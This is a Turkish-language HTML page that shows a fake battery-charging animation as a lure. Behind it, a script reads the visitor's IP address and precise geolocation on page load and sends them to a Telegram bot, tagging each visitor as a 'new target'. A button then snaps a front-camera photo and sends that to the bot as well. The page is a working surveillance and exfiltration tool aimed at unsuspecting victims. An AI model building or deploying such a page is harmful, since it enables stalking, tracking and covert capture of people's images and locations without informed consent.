<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Yükleniyor... Lütfen Bekleyin</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #0f0;
      font-family: 'Courier New', monospace;
      text-align: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h1 { font-size: 2.8em; margin: 10px 0; text-shadow: 0 0 10px #0f0; }
    #percent { font-size: 5em; font-weight: bold; margin: 20px 0; }
    #status { font-size: 1.6em; margin: 20px 0; }
    .progress {
      width: 80%; max-width: 500px; height: 20px;
      background: #111; border: 2px solid #0f0; border-radius: 10px; overflow: hidden;
    }
    .bar { width: 0%; height: 100%; background: linear-gradient(90deg, #0f0, #00ff00); transition: width 0.4s; box-shadow: 0 0 15px #0f0; }
    video { max-width: 90%; height: auto; background: #111; margin: 20px auto; border: 2px solid #0f0; border-radius: 8px; display: none; }
    button {
      padding: 15px 50px; font-size: 1.4em; background: #0f0; color: #000; border: none;
      border-radius: 8px; cursor: pointer; margin: 20px; font-weight: bold;
    }
    button:hover { background: #00ff00; }
  </style>
</head>
<body>

  <h1>Şarj Ediliyor...</h1>
  <div id="percent">0%</div>
  <div class="progress"><div class="bar" id="bar"></div></div>
  <div id="status">Bağlantı, IP ve konum kontrol ediliyor...</div>

  <video id="video" autoplay playsinline muted></video>
  <button id="camBtn">Kamerayı Aç ve Fotoğraf Çek</button>

  <script>
    // URL'den parametreleri al
    const params = new URLSearchParams(window.location.search);
    const chatId = params.get('id') || 'bilinmiyor';
    const botToken = params.get('token');

    const percentEl = document.getElementById('percent');
    const barEl = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    const video = document.getElementById('video');
    const camBtn = document.getElementById('camBtn');

    let percent = 0;

    // Fake şarj animasyonu
    const fakeInterval = setInterval(() => {
      percent += Math.floor(Math.random() * 15) + 5;
      if (percent > 100) percent = 100;
      percentEl.textContent = percent + '%';
      barEl.style.width = percent + '%';
      if (percent >= 100) {
        clearInterval(fakeInterval);
        statusEl.textContent = 'Şarj tamamlandı! Teşekkürler.';
      }
    }, 350 + Math.random() * 700);

    // IP alma
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip || 'alınamadı';
      } catch {
        return 'alınamadı';
      }
    }

    // Konum alma
    async function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve({ error: 'Desteklenmiyor' });
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            lat: pos.coords.latitude.toFixed(6),
            lon: pos.coords.longitude.toFixed(6),
            accuracy: pos.coords.accuracy
          }),
          err => resolve({ error: err.message || 'İzin verilmedi' }),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    // Telegram'a mesaj/fotoğraf gönderme
    async function sendToTelegram(type, data = {}) {
      if (!botToken || !chatId) return console.log('Token veya ID eksik');

      let message = `[${type.toUpperCase()}] Yeni Hedef\n`;
      message += `ID: ${chatId}\n`;
      message += `IP: ${data.ip || 'bilinmiyor'}\n`;
      message += `UA: ${navigator.userAgent}\n`;
      message += `Zaman: ${new Date().toLocaleString('tr-TR')}\n`;

      if (data.location) {
        if (data.location.lat) {
          message += `Konum: ${data.location.lat}, \( {data.location.lon} (± \){data.location.accuracy}m)\n`;
          message += `Maps: https://maps.google.com/?q=\( {data.location.lat}, \){data.location.lon}`;
        } else {
          message += `Konum: ${data.location.error || 'Alınamadı'}`;
        }
      }

      if (type === 'photo' && data.photoBase64) {
        try {
          const blob = await (await fetch(data.photoBase64)).blob();
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', blob, 'capture.jpg');
          formData.append('caption', message);

          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          if (res.ok) console.log('Fotoğraf gönderildi');
          else console.error('Fotoğraf hatası:', await res.text());
        } catch (e) { console.error('Fotoğraf gönderim hatası:', e); }
      } else {
        // Sadece mesaj
        try {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, disable_web_page_preview: true })
          });
          console.log('Mesaj gönderildi');
        } catch (e) { console.error('Mesaj hatası:', e); }
      }
    }

    // Sayfa yüklendiğinde IP + konum logla (her zaman atılır)
    window.addEventListener('load', async () => {
      const ip = await getIP();
      const loc = await getLocation();
      await sendToTelegram('PAGE_OPEN', { ip, location: loc });
    });

    // Kamera butonu
    camBtn.onclick = async () => {
      try {
        statusEl.textContent = 'Kamera açılıyor... İzin ver!';
        camBtn.disabled = true;
        video.style.display = 'block';

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' }
        });
        video.srcObject = stream;

        // Video hazır olana kadar bekle
        await new Promise(r => { video.onloadeddata = r; setTimeout(r, 6000); });

        await new Promise(r => setTimeout(r, 1200)); // Safari/Chrome için ekstra bekleme

        const w = video.videoWidth;
        const h = video.videoHeight;

        if (w === 0 || h === 0) throw new Error('Video boyutu alınamadı');

        const canvas = document.createElement('canvas');
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext('2d');

        let success = false;
        for (let attempt = 0; attempt < 4; attempt++) {
          ctx.drawImage(video, 0, 0, w, h);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.92);

          // Basit siyah kontrol
          const imgData = ctx.getImageData(0, 0, 10, 10).data;
          let brightness = 0;
          for (let i = 0; i < imgData.length; i += 4) brightness += (imgData[i] + imgData[i+1] + imgData[i+2]) / 3;
          brightness /= 100;

          if (brightness > 8) {
            const ip = await getIP();
            await sendToTelegram('PHOTO', { ip, photoBase64: dataUrl });
            statusEl.textContent = 'Fotoğraf çekildi ve gönderildi!';
            success = true;
            break;
          }
          await new Promise(r => setTimeout(r, 600));
        }

        if (!success) {
          statusEl.textContent = 'Fotoğraf alınamadı (siyah frame veya hata)';
          const ip = await getIP();
          await sendToTelegram('CAM_ERROR', { ip, error: 'Siyah frame veya izin sorunu' });
        }

        stream.getTracks().forEach(t => t.stop());
        video.style.display = 'none';

      } catch (err) {
        statusEl.textContent = 'Kamera izni verilmedi veya hata: ' + err.message;
        const ip = await getIP();
        await sendToTelegram('CAM_DENIED', { ip, error: err.message });
      } finally {
        camBtn.disabled = false;
      }
    };
  </script>
</body>
</html>
